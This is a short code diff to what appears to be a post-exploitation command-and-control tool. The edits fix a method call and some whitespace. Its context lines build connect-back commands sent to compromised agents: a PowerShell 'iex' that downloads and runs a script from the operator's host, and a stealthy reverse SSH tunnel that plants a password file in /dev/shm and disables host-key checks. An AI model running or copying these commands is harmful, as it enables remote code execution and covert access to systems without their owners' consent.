@@ -426,7 +426,7 @@ class Main:
                         except Exception as error:
                             self.print('Failed to add a password...\n')
                             return username, None, True
-                        return username, password, update_sshd_config
+                        return username, password, self.update_sshd_config()
                     except Exception as error:
                         self.print('Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id))
                         return None, None, False
@@ -457,7 +457,6 @@ class Main:
                     return self.get_ssh_user(None, None)
                 else:
                     return None, None, False
-
 
     def update_sshd_config(self):
         self.print('Ensuring that local port forwarding is disabled (to prevent a "hack back" scenario)...')
@@ -750,7 +749,7 @@ class Main:
 
                             connect_back_cmd = 'iex ((New-Object System.Net.WebClient).DownloadString("http://{}:{}/{}")); Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_port, secret_string, proxy_ip, proxy_ssh_username, proxy_ssh_password)
                         else:
-                            shm_name =  ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=5))
+                            shm_name = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=5))
                             connect_back_cmd = 'echo "echo {}" > /dev/shm/{} && chmod 777 /dev/shm/{} && DISPLAY=dummy SSH_ASKPASS=/dev/shm/{} setsid ssh -o UserKnownHostsFile=/dev/null -f -N -R 8001 -oStrictHostKeyChecking=no {}@{} >/dev/null 2>&1 &'.format(proxy_ssh_password, shm_name, shm_name, shm_name, proxy_ssh_username, proxy_ip)
                         self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[int(command[2])], connect_back_cmd)
                         self.print('Remote agent instructed to connect!')
